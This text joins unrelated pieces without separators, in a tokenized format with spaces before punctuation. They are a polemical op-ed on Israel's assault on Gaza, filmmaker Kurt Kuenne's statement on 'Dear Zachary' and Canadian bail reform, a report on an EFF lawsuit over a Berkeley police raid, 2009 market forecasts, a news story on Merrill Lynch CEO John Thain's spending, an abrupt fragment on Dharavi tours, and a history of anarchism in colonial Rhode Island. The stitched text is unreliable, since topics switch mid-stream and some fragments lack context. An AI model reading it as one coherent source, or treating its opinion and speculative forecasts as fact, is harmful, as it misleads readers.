Despite the threat and charged emotions , would n’t a humane invading military exercise care before sending shells into a school because some person was supposedly shooting from a schoolyard adjacent to where hundreds of innocent persons had taken shelter ?
Israel has lowered the bar to where completely one - sided warfare that includes harming and terrifying innocent civilians to any limit becomes acceptable .
A world composed of maddening leaders has now made us all potential victims to any transgression on the all powerful .
Israel , for 60 years , has used security considerations as a reason for warfare and has not gained ‘ security . ’
Either Israel is using the wrong tactics to achieve security or security is a cover for other objectives .
Considering that Israelis , most of whom only arrived in the last 40 years , live prosperously while Palestinians who tilled the land for generations live at subsistence levels , something must be skewed in the debate of who is doing what to whom .
A militarily and economically strong Israel , which shows no damage to its infrastructure or property , poses as the victim , while the militarily and economically futile Palestine territory , which has had its infrastructure and property expropriated and often reduced to rubble by Israeli attacks , is labeled the aggressor .
Hamas might be an obstacle to peace , but the organization is not the principal obstacle .
The principal impediments to peace are the illegal occupation and settlements , seizures of Palestinians lands , abusive checkpoints “ and the blockade of Gaza .
Does Israel have a security problem that can only be ameliorated by overpowering military force or is Israel using security considerations as an opportunity to humble the Palestinian people before consolidating its territorial gains and expansionist aims ?
Every day it becomes clearer that the Gaza engagement is only a stage in Israel ’s testing of new weapons and new strategies for its predictable battles with Hezbollah , Syria , Iran and who knows who else .
Israel has more serious enemies then all other nations combined .
The attack on Gaza explains that situation .
We await endless wars by an apparent out of control military machine that will be followed by escalating threats to the world due to the increasing violence — a thoughtful gesture from world leaders supposedly dedicated to protect their citizens .
Designated by critics as the Prussia of the Middle East , an army that has a nation , Israel must recognize that a population already under siege due to sanctions and embargo while living precariously with lack of food , water , electricity and other essentials of life , is at the tipping point of total destruction .
The only way for the Gaza Palestinians to leave the fenced and blockaded Gaza and escape the onslaught is by death .
Can we assume that many Palestinians , the oxygen sucked from their lungs by the missile blasts , in their last gasp note a relief in their intensive suffering and murmur the words once spoken by Martin Luther King , “ Free at last , free at last , thank God , I ’m finally free at last ? ”
How many of the world ’s peoples are scheduled to utter similar words in the near future ?
Statement from the Filmmaker
Addendum , December 16 , 2010 :
Bill C - 464 became law in Canada yesterday , amending Canada 's bail code with a clause giving courts the power to refuse bail to someone charged with a serious crime who is a potential danger to children under the age of 18 , an amendment which likely could have saved Zachary had it been in place in 2003 .
As I said in my original statement below , it was my goal in releasing this movie publicly to amend bail law in Canada ; I 'm pleased to be able to say that , as of yesterday , that goal is a reality .
My sincerest thanks to MP Scott Andrews and Senator Tommy Banks who created Bill C - 464 after seeing " Dear Zachary " , and saw to it that it became law .
I also want to thank the thousands of you who wrote to Parliament in support of our cause ; this would n't have happened without you .
I 've been humbled and overwhelmed by the response to this movie , which has provoked reactions I never could have imagined .
Your letters mean so much to me , and I truly thank all of you for taking the time to write .
Please stop by the " Bail Reform " section and read a letter of thanks to you from Kate & David Bagby .
Thank you so much for your passionate support , and for helping make the world a safer , better place .
- Kurt Kuenne
Original Statement , November 2006 :
I wish that I had never had the opportunity to make this film .
I wish that my friend Dr. Andrew Bagby was alive and well and that I was blissfully ignorant of the lessons I 've learned along this journey .
Alas , this is not the case .
When bad things happen , good people have to take what they 've learned and make the world a better place , and that is precisely what I hope this film will do – make the world a better place .
Filmmaker Kurt Kuenne and Dr. Andrew Bagby , April 1981 .
Filmmaker Kurt Kuenne and Dr. Andrew Bagby , April 1981 .
When my close friend Dr. Andrew Bagby ( 1973 -2001 ) was murdered by his ex-girlfriend , Dr. Shirley Turner , I decided to make a film to memorialize him for family and friends .
When I learned that Shirley Turner was pregnant with Andrew 's son , whom she later named Zachary , my project took on a whole new meaning .
My mission became to make this film for Zachary , as a letter from all of Andrew 's loved ones to him , which he could one day view and get to know his father .
When Shirley Turner killed again one year later in an unspeakable murder - suicide , my focus changed yet again .
A second murder did not have to happen .
From 2001 to 2003 , Shirley Turner was an accused probable pre-meditated first degree murderer who had fled her home to avoid prosecution , and despite a pile of evidence that she was very likely a manipulative cold - blooded killer , the government of Canada allowed her to walk free on bail for a full year and a half , all the while having custody of a child .
I found this situation beyond appalling – that an accused pre-meditated murderer could flee the United States , find refuge in Canada and hang out partying while my friend lay in ashes inside an urn .
Mostly , I found it appalling that , knowing how potentially dangerous she was , she was given the opportunity to kill again .
Sadly , this has happened more than once .
In 1994 , John Cousins and Derek Allen stabbed a man named Marvin Squires to death in Canada .
When free on bail pending trial for the Squires murder , John Cousins killed another man , Edward Shaw , stabbing him over 60 times .
Bail laws need to be carefully reviewed and reformed , so that Canada will no longer unwittingly function as a safe haven for fugitive murderers from the United States , or as a safe haven for accused murderers of their own .
How does one make that happen ?
The most compelling argument I could make was to tell this story from the trenches .
To tell it the way it happened to me , the way it happened to Andrew 's hundreds of friends , his family and , most of all , to show the experience his parents went through during this travesty - laden miscarriage of justice .
Murders are not news items .
They are not statistics .
They are gut wrenching experiences that rip apart the fabric of lives and destroy reasons for living , creating a ripple effect that damages thousands of lives and leaves a chilling absence where there once was warmth and love .
It is my hope that this film puts people right inside that experience and that no one will be able to come away from it unchanged .
It is my goal to get this film seen all around the world , but in particular by the citizens of Canada .
They have the power to prevent a recurrence of this catastrophe , the power to compel their Parliament to deny bail to people accused of murder pending a speedy and fair trial , so that innocent lives are not continually put at unnecessary risk .
I will be making every effort to get this film seen by lawmakers in Canada and abroad , where applicable .
As Andrew 's parents , Kate and David Bagby , have said repeatedly , " The best we can get out of this is change in the future to prevent a recurrence .
It 's too horrible to let it happen again . "
Proceeds from this film will be split between Andrew 's two key memorial funds : the Dr. Andrew Bagby Scholarship in Family Medicine at Latrobe Area Hospital in Latrobe , Pennsylvania , and the Dr. Andrew Bagby and son Zachary Bursary at Memorial University of Newfoundland .
Both funds are intended to support and encourage physicians who are pursuing Andrew 's calling of family medicine .
I will also provide copies of this movie to the funds ' recipients in perpetuity , so that they can learn about the person who is paying for their education .
In the last phone conversation I ever had with Andrew , he asked me if I 'd ever heard the Garth Brooks song " Standing Outside the Fire " .
I had n't .
He said the song reminded him of me because " I 've never thought of you as standing outside the fire . "
After he died , I was bequeathed Andrew 's copy of the album .
The chorus is :
Life is not tried , it is merely survived
If you 're standing outside the fire
I hope this film will inspire lawmakers and citizens everywhere to take a look at themselves , decide what they stand for and do their best to live a life they can look back on proudly .
We are alive .
We have the opportunity to do and achieve anything we can imagine .
For those who are just surviving – and for those members of the Canadian governmental systems who scrambled to save face in the wake of this tragedy rather than admit error and take positive action – I hope it will inspire them to go forth , use their power for good and jump into the fire .
I hope that you will join me on what has been the most rewarding journey of my life .
I believe we can make the world a safer , better place .

The FBI , Alameda County , and the Regents of the University of California are named in a lawsuit filed by the Electronic Frontier Foundation ( EFF ) on behalf of two activist groups near Berkeley who were recently the targets of a law enforcement raid .
The organizations — the East Bay Prisoner Support Group ( EBPS ) and an independent bookstore and library called Long Haul — claim that their computers and records were wrongfully seized .
They are asking the court for injunctive and declaratory relief .
The two organizations were raided in August last year after Detective William Kasiske obtained a warrant from the Alameda Superior Court .
The EFF contends that the warrant , which authorized the search of Long Haul 's offices , was granted improperly because the Detective failed to establish probable cause or produce evidence demonstrating specific wrongdoings by Long Haul .
The raid of the EBPS offices on the first floor of the building were unlawful , the EFF says , because the warrant did not name EBPS at all or grant police the authority to search the group .
Officers from the University of California , Berkeley police department forcibly entered the premises when they were denied access by the landlord .
Several members of the Long Haul organization arrived at the scene during the middle of the raid , but the police offers refused to show them the warrant .
The exact purpose of the raid has not been disclosed .
Law enforcement agents believe that one of the computers that is accessible for use by the general public in Long Haul 's library was used to perpetrate a crime of some kind .
The police confiscated a large volume of records , including library book lending records , and took every computer in the building — not just the two computers that were publicly accessible .
They also seized materials from Long Haul 's private offices , where the organization stores the documents and research materials that they use for an independent publication that they produce and distribute to the public .
The EFF maintains that the seizure of documents that were being prepared for imminent publication is particularly egregious because it violates the federal Privacy Protection Act .
And Long
Haul contends that the private office in their facility that was used for the newspaper was unmistakably marked as such , and should not have been ransacked .
" The Slingshot and EBPS computers were clearly marked and kept behind locked doors , " said EFF Civil Liberties Director Jennifer Granick in a statement .
" Yet the raid officers broke into the offices to take information these organizations collected and relied on to publish information to their readership .
This is a blatant violation of federal law and the First and Fourth Amendments , interfering with the freedom of the press . "
The equipment that was seized has been returned , but the members of Long Haul and EBPS fear that the police have retained copies of all the data .
They seek a judicial declaration affirming that the raid was unconstitutional and a permanent injunction to block law enforcement agents from conducting further investigations with the collected data .
This case goes to the very heart of the EFF 's values .
The organization was founded in the aftermath of an infamous and outrageously misguided raid conducted by the Secret Service against Steve Jackson Games in the early 90s .
The EFF has sought to protect citizens from unlawful raids and to set precedents that will raise the legal standards for search and seizure so that civil liberties wo n't crumble as technology becomes more pervasive .
Much like the original SJG case , the EFF wants to make sure that a vague suspicion of wrongdoing is n't used to justify an unconstrained fishing expedition in private data .

John Lee's Forecasts On Gold And Financial Markets For 2009
In 2008 we saw some of the most dramatic financial events in a century :
* $ trillions of subprime mortgage implo sion , which bankrupted the entire US banking system .
* Lehman 's fallout with entangling positions in equities , futures , real estate , and derivatives in the $ hundreds of billions .
The magnitude dwarfed LTCM .
* Biggest squeeze on the dollar .
D espite worsening fundamentals , dollar rallied 20 % in the second half of 2008 as banks refused to loan and assets are sold to pay dollar debts .
* Largest de-leveraging process .
Margin calls caused severe corrections ( - 50 % or more ) in broad equities and commodities .
* Un precedented intervention with multi-$trillion financial bailouts and record - low interest rates o f near 0 % .
What 's in store for 2009 ?
We will make our calls with the aid of following charts
Gold :
Case for :
Gold is liquid , compact , universally accepted , and can not be created or diluted at will .
As investors face zero % yield , uncertain economic times , and daunting deficits , it 's no surprise that gold came through 2008 unscathed .
Case Against : Gold has faired very well while all other asset classes endured severe correction in 2008 .
Gold right now is near its historic high compared to oil and copper .
It is an emotional investment , which makes the top and bottom difficult to call .
Verdict : I look for side - way action for gold between $ 700 and $ 1,000 / oz as markets battle through fears of depression to come to gri p s with inflation .
US Dollar :
Case For : US
A is the world 's largest economy by far .
US dollar is the most liquid currency and de-facto settlement currency for global trades .
As we go through the deleveraging process , dollars will continue to be raised for debt repayment .
Comparatively speaking , currencies that make up the dollar index basket are in no better shape .
Case Against : US budget deficit will exceed $ 1 trillion / year , well over 5 % of GDP for the foreseeable future .
This puts a strain on the dollar .
There are also record amount of dollars ab road yet to be diversified and spent .
Verdict :
The factors that drove up the dollar are temporary ; therefore a dollar correction could be underway soon .
I see dollar index between 88 and 72 for 2009 .
S&P 500 :
Case For : S&P 500 dividend yield is on par with interest rate yield ; something not seen since 1950's and provides support for equities .
Globalization helps Americans tab into new markets ( for example , there are 350 million smokers and net - users in China ) and enables international investors tab into US equities .
Lastly the financial sector has been decimated and is weighted minimally in the index .
Case Against :
The world economy is slowing down .
Many companies are straddled with debts and phased - out products , and likely wo n't survive .
Verdict : Today 's dollar is perhaps half of what it was 10 years ago .
The S&P500 index is trading at a decade low .
At zero % interest rate , I do n't see much downside and would peg S&P500 between 800 and 1,200 for 2009 .
Gold Stocks :
Gold stocks provide leverage to the gold price with high fixed cost and low marginal cost .
Gold stocks could n't shake off the equity bloodbath and disappointed investors by losing 30 % + in 2008 .
The action for 2009 will remain volatile as margin calls will continue to cause weak hands to sell into strong hands .
There are also many poorly managed gold companies that wo n't survive through permitting issues , high operating cost , and geopolitical risk .
Gold equity valuation is about earnings and ounces in the ground .
I am not wildly bullish on gold stocks yet as speculative spirits could take months to return .
H owever a modest rebound to 150 from current 105 is very reasonable and represents healthy percentage gains .
Oil , Copper , Silver :
Case For :
In 2008 , Oil and Copper staged the biggest crash in their respective history with oil losing 75 % in 6 months ( $ 145 to $ 35 / barrel ) , and copper down 70 % from $ 4 to $ 1.25 / pound .
Commodity prices such as nickel , zinc , and oil are at decade lows having adjusted for inflation .
The large contango in oil futures suggest s big moves could be ahead .
With the margin calls winding down , the slightest addition of speculative money will provide oil with substantial lift .
Case Against : Inventories are piling up for oil and select commodities .
The global slowdown will continue to put a demand constraint on commodity usage .
Many of the oil investors are licking their wounds and might not return in short order .
Verdict : Faced with imminent dollar correction and inflationary monetary policies , commodities at today 's prices have more room to go up than down , particularly zinc which peaked much earlier and therefore has a stronger base .
My calls for oil are between $ 40 - $ 60 / barrel , copper $ 1.25 - $ 2 / pound , silver $ 10 - $ 15 /oz , and zinc 60 cents to $ 1 / pound .
S&P TSX Ventures Index ( Proxy to Junior Mining Stocks ) :
Case for :
In the heat of the credit crunch in Nov 2008 , we saw a handful of junior mining issues trading at upwards of 70 % discount to cash values .
Toronto saw zero IPOs in Q3 .
Unless oil dives to $ 20 and copper goes below $ 1 , I would say the capitulation has already occurred in the junior resource sector .
Case against : Majors such as Teck and Rio Tinto are straddled with debt and depressed commodity prices , this make s junior buyouts less likely .
Financing junior issues will continue to be difficult , and speculative appetite ( i.e. dispensable cash ) will not return to the 2008 level with growing unemployment .
Verdict : Look for 700 as bottom and 1 , 250 as peak for 2009 .
Bargains abound today so you can be very selective .
Avoid gigantic low grade deposits with big promises and big CapEx .
Buy companies that are debt free , cash - rich with confirmed economic deposits , and preferably already producing or developing with secured financing .
Global Equities ( using Shanghai Stock Exchange Index as Proxy ) :
Case for :
The index lost a stunning 70 % in 2008 and currently rests on decade - long support level .
China 's GDP growth while slowing still project s to be 5 - 10 % for 2009 .
Asia is minimally involved in the subprime crisis and Asian consumers have collectively better balance sheets than American counterparts .
Case against : Exports to US account for 10 - 20 % of China 's GDP , US slowdown invariably affect s the Chinese economy .
Lingering economic concerns and shrinking investment capital means spring - board style rebound is not likely in 2009 .
Verdict :
In Asia , 2009 will mark a major shift of focus from US exports to developing domestic consumption .
D espite good fundamentals , I am not wildly bullish on Asian markets just yet .
However a decent rebound of 20 - 25 % from currently depressed level is achievable in 2009 .
Conclusion : Since 2001 , we saw world GDP grow at the fastest pace since WWII , doubling to $ 55 trillion .
Fundamentally , industrialization of Asia and Middle - east spurred growth and vast commodity consumption .
On the investment side , dollar savers of 20 years came to the epiphany that dollars are no better than Brazil Real ( literally based on currency performance ) and started the massive flight from dollars .
This dollar diversification coupled with low interest rates further fueled commodity , real estate , and equity markets world wide .
All this is at the expense of the dollar , which lost some 60 % measured by the dollar index .
Gold predictably went up 300 % from $ 250 / oz to over $ 800 / oz .
2008 is a hiccup to the above trend .
Housing implosion bankrupted US banks and caused temporary hard squeeze on the dollar .
Helicopter Ben and Mr. Obama have promised to take whatever fiscal and monetary action necessary to revive the economy .
And those official do n't mince with their words as witnessed by the Fed 's purchase of $ trillions of bad loans and Obama 's massive fiscal stimulus proposals .
All this seals the death fate of the US dollar and will likely invoke imminent panic from dollar holders .
Growth in Asia and elsewhere in the world will not stop just because no more dollars are coming from the US consumers .
Pick China as an example ; frankly would China worry about not getting more dollars when it already has $ 1.5 trillion ?
Granted the US economy is in emergency distress mode , but can the US population , which account for 5 % of the world population , really drag down the rest of the world for years and years to come ?
I think not .
In fact , from a long term worldly perspective , 2008 might be the catalyst that accelerates global wealth distribution and growth going forward .
When will we see good times again in Shanghai and Buenos Aires ?
When will happy patrons return to the empty restaurants and department stores ?
Processor speed doubles every 18 months , the pace of progress is fastening exponentially .
While growth maybe anemic in 2009 , do n't count out packed seats in the Vancouver Winter Olympics in 2010 !

Report : Merrill Lynch CEO Spent Over $ 1 M to Redecorate Office Before bailout $ 's , exec said to have hired decorator ; bought luxury furniture .
January 22 , 2009  --
Less than one month into his new gig at the Bank of America , Merrill Lynch CEO John
Thain resigned today after it was revealed that he doled out executive bonuses a month ahead of schedule and just days before his struggling Merrill Lynch firm was acquired by the BofA .
Although no reason was given for his resignation , a spokesman for Bank of America , which acquired Merrill Lynch at the beginning of this year in a government - negotiated deal to save it from collapse , issued a statement saying : " ( BofA Chairman and CEO ) Ken Lewis flew to New York today to talk to John Thain .
And it was mutually agreed that his situation was not working out and he would resign . "
The amount in bonuses paid out was between $ 3 and $ 4 billion , according to the Financial Times .
Exorbitant Wall St. bonuses have garnered increased attention since the economic collapse and subsequent billions in bailout funds have gone to help companies stay afloat .
Bank of America , which received $ 25 billion in bailout funds before being handed an addition $ 20 billion last week , said Thursday that it knew Thain gave the incentives ahead of time .
" Merrill was an independent company until Jan. 1 of 2009 , " said spokesman Scott Silvestri .
" John
Thain decided to pay year - end incentives in December , as opposed to their normal date in January .
Bank of America was informed of his decision . "
Report Says Thain Spent Over $ 1 Million To Redecorate Office
To make matters worse , Thain is now facing more criticism for reportedly spending $ 1.2 million to lavishly decorate his Merrill Lynch office early last year while the firm was fighting to survive .
Thain splurged on interior designs from the Obama 's chosen White House decorator Michael Smith ( $ 800,000 ) , two area rugs ( $ 131,000 ) , two guest chairs ( $ 87,000 ) , a 19th Century credenza ( $ 68,000 ) , four pairs of curtains ( $ 28,000 ) , and a mahogany pedestal table ( $ 25,000 ) , according to Charlie Gasparino , the CNBC contributor and Daily Beast columnist who broke the story .
Other items mentioned : six dining room chairs ( $ 37,000 ) , a George IV Desk ( $ 18,000 ) , a custom coffee table ( $ 16,000 ) , a sofa ( $ 15,000 ) , a chandelier ( $ 13,000 ) , a mirror ( $ 5,000 ) , six wall sconces ( $ 2,700 ) .
Also reported to be on the list was a trash can for $ 1,400 .
Thain 's lavish spending shows that even as the gilded age of Wall St. comes to an end , he " occupied this rarified strata on Wall Street " and " just did n't get it , " said banking industry analyst Nancy Bush .
" It 's time for all this to be gone because the reality needs to set in on Wall St. that the business has changed for the foreseeable future , if not forever , " Bush added .
Thain 's Decorator Chosen by Obamas for the White House
Thain apparently did n't get much of a deal – the First Family is paying Smith just $ 100,000 to decorate their new presidential home , according to the report .
Merrill Lynch and Smith did not immediately respond to calls from ABCNews.com seeking comment .
Thain could not be reached .
Thain , a Harvard MBA , was named Chairman and CEO of Merrill in November 2007 .
The following January , the firm announced record - breaking losses of over $ 8 billion .
By April the troubled investment bank had said it would lay off as much as 10 percent of its workforce .
Senators Say Exhorbitant Spending Needs to Stop
Senator Bill Nelson ( D - FL ) said Friday that Thain 's office remodeling was just the last straw of " inconceivable and irresponsible and inexcusable behavior " shown by Wall St. corporations .
Nelson is one U.S. Senate member who said this type of spending prompted legislation , introduced Friday , that establishes clear guidelines on how corporations can use federal bailout funds and increases accountability and transparency in spending .
" For the folks all across America who are experiencing these daily financial difficulties and losing their jobs and their business and their companies , and then to see that their money is being wasted excessively by greedy Wall St. executives – this has to stop , " said Nelson .
The Troubled Asset Relief Program Transparency Reporting
Act would prohibit companies from using bailout dollars to pay for private jets or travel expenses , holiday parties , entertainment , office renovations , lobbying , political contributions , conferences and events .
The Associated Press contributed to this report .
But they are conducted with exemplary sensitivity , and the cooperation of the residents , and 80 per cent of profits are donated to local charities .
Most importantly , they certainly did not feel exploitative to me .
In fact I found touring a place like Dharavi to be an education .
In the recycling area old ink vats , cooking - oil containers and paint tins were being returned to gleaming perfection , while scraps of trashed plastic were converted into pristine pellets and twisted aluminium was returned to ingots .
Libertarians tend to fall into two opposing errors on the American past : the familiar “ Golden Age ” view of the right - wing that everything was blissful in America until some moment of precipitous decline ( often dated 1933 ) ; and the deeply pessimistic minority view that rejects the American past root and branch , spurning all American institutions and virtually all of its thinkers except such late nineteenth - century individualist anarchists as Benjamin R. Tucker and Lysander Spooner .
The truth is somewhere in between : America was never the golden “ land of the free ” of the conservative - libertarian legend , and yet it managed for a very long time to be freer , in institutions and in intellectual climate , than any other land .
Colonial America did not set out deliberately to be the land of the free .
On the contrary , it began in a tangle of tyranny , special privilege , and vast land monopoly .
Territories were carved out either as colonies subject directly to the English Crown , or as enormous land grabs for privileged companies or feudal proprietors .
What defeated these despotic and feudal thrusts into the new territory was , at bottom , rather simple : the vastness of the fertile and uninhabited land that lay waiting to be settled .
Not only relative freedom , but even outright anarchist institutions grew up early in the interstices between the organized , despotic English colonies .
ALBEMARLE
There is a good possibility that for a couple of decades in the mid-seventeenth century , the coastal area north of Albemarle Sound in what is now northeastern North Carolina was in a quasi-anarchistic state .
Technically a part of the Virginia colony but in practice virtually independent , the Albemarle area was a haven for persons chaffing under the despotic rule of the English Crown , the Anglican Church and the large planter aristocracy of Virginia .
Roger Green led a Presbyterian group that left Virginia proper for Albemarle , and many Quakers settled in the area , which specialized in growing tobacco .
This semi-libertarian condition came to an end in 1663 , when the English Crown included Albemarle in the mammoth Carolina land grant bestowed on a group of eight feudal proprietors .
Little is known of pre-1663
Albemarle , since historians display scant interest in stateless societies . [ 1 ]
“ ROGUE ’S ISLAND ”
Undoubtedly the freest colony in America , and the major source of anarchistic thought and institutions , was little Rhode Island , which originated as a series of more or less anarchic settlements founded by people fleeing from the brutal politico - religious tyranny of the Puritans of Massachusetts Bay ( who referred to the new territory as “ Rogue ’s Land ” ) .
Unsettled and untouched by the land grants or the Crown , the Rhode Island area provided a haven close to the Massachusetts Bay settlement .
Providence , the first refugee settlement , was founded in 1636 by the young Reverend Roger Williams .
A political and especially a religious libertarian , Williams was close to the Levellers — that great group of English laissez - faire individualists who constituted the “ extreme left - wing ” of the republican side in the English Civil War .
At first , the Williams settlement was virtually anarchistic .
As Williams described it , “ the masters of families have ordinarily met once a fortnight and consulted about our common peace , watch and plenty ; and mutual consent have finished all matters of speed and pace . ”
But this anarchistic idyll began to flounder in a tragically ironic trap that Williams had laid for himself and his followers .
Williams had pioneered in scrupulously purchasing all the land from the Indians voluntarily — a method of land acquisition in sharp contrast to the brutal methods of extermination beloved by the Puritans of Massachusetts Bay .
But the problem was that the Indians had erroneous theories of property .
As collective tribes they laid claim to vast reaches of land on which they had only hunted .
Not having transformed the land itself , they were not entitled to all of the land that they sold .
Hence , Williams and his group , by purchasing all of this unsettled land , willy - nilly acquired these illegitimate land titles .
Thinking that he had been generous , voluntaristic and libertarian , Williams ( and his group ) fell into the trap of becoming a feudalistic group of landowners .
Instead of automatically acquiring the land in Providence that they homesteaded , later settlers had to purchase or rent the land from the original Williams claimants .
The result was that Williams and his original colleagues , who had formed “ The Fellowship , " found themselves in the position of being oligarchic rulers of Providence as well as Providence ’s land “ monopolists . ”
Once again , as so many times in history , land - monopoly and government went hand in hand .
While a libertarian , Williams never became an explicit anarchist , even though he established an anarchistic community in Providence .
The honor of being the first explicit anarchist In North America belongs to Williams ’s successor , a leading religious refugee from Massachusetts , Anne Hutchinson .
Anne and her followers , who had become far more numerous a band of heretics than Williams had amassed , emigrated to the Rhode Island area in 1638 at the suggestion of Williams himself .
There they purchased the island of Aquidneck from the Indians and founded the settlement of Pocasset ( now Portsmouth ) .
Anne soon became restive at Pocasset , seeing that her follower and major founder of the settlement , the wealthy merchant William Coddington , had quickly established his own theocratic rule over the infant colony .
For Coddington , as “ judge ” of the settlement , based his decrees and rulings on the “ word of God , " as arbitrarily interpreted by himself .
Coddington , this time far more explicitly and consciously than Williams , founded his dictatorial power on his deed of purchase of the island from the Indians .
Since his was the only name on the deed of purchase , Coddington claimed for himself all the “ rights ” of land monopolist and feudal lord , allotting no rights to homesteading settlers .
Anne Hutchinson , not yet an anarchist , now launched a political struggle against Coddington in early 1639 forcing him to give the entire body of freemen a veto over his actions .
In April , Coddington was forced to agree to elections for his post as Governor , a position that he had expected to be his permanently by feudal right .
Anne ’s husband , William Hutchinson , defeated Coddington in the elections , and Coddington and his followers left Pocasset to found a new settlement called New Port at the southern end of the island .
The victorious Hutchinsonians adopted a new constitution , changing the name of the town to Portsmouth , and stating that ( 1 ) all male inhabitants were equal before the law ; ( 2 ) Church and State were to be kept separate ; and ( 3 ) trial by jury was to be established for all .
Immediately thereafter Coddington declared war upon Portsmouth and at the end of a year of turmoil , the two groups agreed to unite the two settlements .
Coddington was once more chosen as governor , but with democratic institutions and religious liberty guaranteed .
From the point of view of social philosophy , however , the important consequence of this struggle with Coddington was that Anne Hutchinson began to reflect deeply on the whole question of liberty .
If , as Roger Williams had taught , there must be absolute religious liberty for the individual , than what right does government have to rule the individual at all ?
In short , Anne Hutchinson had come to the conclusion of the “ unlawfulness of magistry government . ”
As Anne ’s biographer Winifred Rugg put it : “ She was supremely convinced that the Christian held within his own breast the assurance of salvation …
For such persons magistrates were obviously superfluous .
As for the others , they were to be converted , not coerced . ”
Anne persuaded her husband to resign as one of Coddington ’s major assistants in the colony .
In 1642 , soon after his resignation , William Hutchinson died .
Deprived of her husband and disgusted with all government , Anne left Rhode Island to settle at Pelham Bay , near New York City .
There , in the late summer of 1643 , Anne and her family were killed by a band of Indians , who had been set upon by the Dutch of New York .
But while Anne Hutchinson was dead , her ideas lived on .
Some of her followers , headed by Anne ’s sister Mrs. Catherine Scott , headed the new Baptist movement in Rhode Island , which , as we shall see , was later to erupt as a highly important movement of Baptist anarchists .
One of the most interesting individualists of the American colonial period was Samuell Gorton .
An English clothier , his libertarian political and religious views and individualistic spirit got him persecuted in every colony in New England , including Providence and Portsmouth .
An opponent of theocracy , and indeed of all formal religious organizations , Gorton opposed all transgressions of government against the rights guaranteed by English common law .
Fleeing Anglican England , Gorton successively had to escape from Massachusetts Bay , Plymouth , Portsmouth , and Providence .
In the Providence incident Roger Williams began to display that totalitarian temperament , that impatience with anyone more individualistic than he , that was later to turn him sharply away from liberty and towards statism .
Williams agreed to the expulsion of Gorton from Providence , declaring that Gorton was “ bewitching and bemadding poor Providence … with his unclear and foul censures of all the ministers of this country …
”
Accused of being “ anarchists , ” denounced by Governor Winthrop of Massachusetts Bay as a “ man not fit to live upon the face of the earth , ” Gorton and his followers were forced in late 1642 to found an entirely new settlement of their own : Shawomet ( later Warwick ) which he purchased from the Indians .
There the little settlement was under continued threat of aggression by their mighty Massachusetts neighbor .
While Gorton was not explicitly an anarchist , the little town of Shawomet lived in an anarchist idyll in the years that it remained a separate settlement .
In the words of Gorton , for over five years the settlement “ lived peaceably together , desiring and endeavoring to do wrong to no man , neither English nor Indian , ending all our differences in a neighborly and loving way of arbitration , mutually chosen amongst us . ”
But in 1648 , Warwick joined with the other three towns of Rhode Island to form the colony of the “ Providence Plantation . ”
From that time on Warwick was under a government , even though this was a government far more democratic and libertarian than existed anywhere else .
As a respected leader of the new colony , now considered “ fit to live ” in Rhode Island , Gorton managed to abolish imprisonment for debt , lower the term of indentured service , and even to be the first to abolish slavery in America , even though abolition turned out to be a dead letter .
After two decades of struggle against the aggressions of Massachusetts , Roger Williams was finally able , in the mid-1650s , to win immunity for Rhode Island , by gaining the protection of the victorious republican revolutionaries of England .
At the time of winning its protection from Massachusetts , Williams described the colony as having “ long drunk of the cup of as great liberties as any people that we can hear of under the whole heaven . ”
“ Sir , ” Williams added , writing to his libertarian English friend Sir Henry Vane , “ we have not known what an excise means ; we have almost forgotten what tithes are , yea , or taxes either , to church or commonwealth . ”
Yet it was almost immediately after this triumph that Williams savagely turned on the liberty of the colony he had founded .
Why the shift ?
Several reasons can be found : first , the inevitable corruptions of governmental power on even the most libertarian of rulers ; and second , Williams ’s impatience with those even more libertarian than he .
But a third reason has to do with the loss of liberty in England .
For two decades , Roger Williams had worked closely with the most libertarian and individualistic groups in the revolutionary movement in England ; but now , just as the laissez - faire , individualist “ left ” seemed to have triumphed , England suddenly moved precipitously rightward and stateward under the new dictatorship of the Independent Oliver Cromwell .
The shift away from liberty in England was embodied in Cromwell ’s brutal suppression of the Levellers , the leaders of libertarianism in the Revolution .
With the mother country sliding away from liberty and into dictatorship , the aging Williams undoubtedly lost much of his previously firm grip on libertarian principle .
Williams ’s shift from liberty was first revealed in 1655 , when he suddenly imposed a system of compulsory military service on the people of Rhode Island .
It was in reaction to this violation of all the libertarian traditions of Rhode Island that a vigorous opposition developed in the colony — an opposition that eventually polarized into outright individualistic anarchism .
Heading this move toward anarchism was the bulk of the Baptists of Rhode Island .
Led by the Reverend Thomas Olney , former Baptist minister of Providence , and including also John Field , John Throckmorton , the redoubtable William Harris , and Williams ’s own brother Robert .
This group circulated a petition charging that “ it was blood guiltiness , and against the rule of the gospel to execute judgement upon transgressors , against the private or public weal . ”
In short , any punishment of transgressors and / or any bearing of arms was anti-Christian !
Williams ’s response was to denounce the petition as causing “ tumult and disturbance . ”
The anarchists thereupon rose in rebellion against Williams ’s government , but were put down by force of arms .
Despite the failure of the revolt , the 1655 elections of a few months later , elected Thomas Olney as an assistant to the inevitably re-elected Williams , even though Olney himself had led the uprising .
Williams proceeded to aggrandize statism still further .
The central government of the colony decided to bypass the home - rule right of the individual towns to finance the colony , and appointed central officials to levy general taxes directly upon the people .
Laws against “ immorality ” were also strengthened , with corporal punishment to be levied for such crimes as “ loose living . ”
The anti-immorality laws were probably a part of an attempt by Williams to curry favor with the Puritanical Oliver Cromwell .
Most ominously , after Cromwell had ordered Rhode Island to punish “ intestinal commotions , ” the colony swiftly passed a law against “ ringleaders of factions ” who were thereafter to be sent to England for trial .
Baptist anarchism , however , continued to intensify in Rhode Island .
One of the new adherents was none other than Catherine Scott , a leading Baptist preacher and the sister of Anne Hutchinson .
In this way , Anne ’s lone pioneering in philosophical anarchism before her death had planted a seed that burst forth a decade and a half later .
Also adopting anarchism were Rebecca Throckmorton , Robert West , and Ann Williams , wife of Robert .
Finally , in March 1657 , the crackdown on freedom of speech and dissent arrived .
Williams hauled these four anarchist opponents into court , charging them with being “ common opposers of all authority . ”
After this act of intimidation , however , Williams relented and withdrew the charges .
But Williams had accomplished the singular purpose of his repression : the frightened anarchist leaders lapsed into silence .
The formidable William Harris , however , could not be frightened so readily .
Harris circulated a manuscript to all the towns of Rhode Island , denouncing all taxation and “ all civil governments . ”
He called upon the people to “ cry out , No lords , No masters . ”
Harris predicted that the State , which he called “ the House of Saul , " would inevitably grow weaker and weaker , while the “ House of David ” ( namely Harris and his followers ) would grow stronger and stronger .
Harris also condemned all punishments and prisons , all officials and legislative assemblies .
William Harris was now hauled into court by the Williams administration .
He was charged with “ open defiance under his hand against our Charter , all our laws … Parliament , the Lord Protector [ Cromwell ] and all governments . ”
Instead of quieting under repression as had Mrs. Scott and the others , Harris swore that he would continue to maintain his anarchism “ with his blood . ”
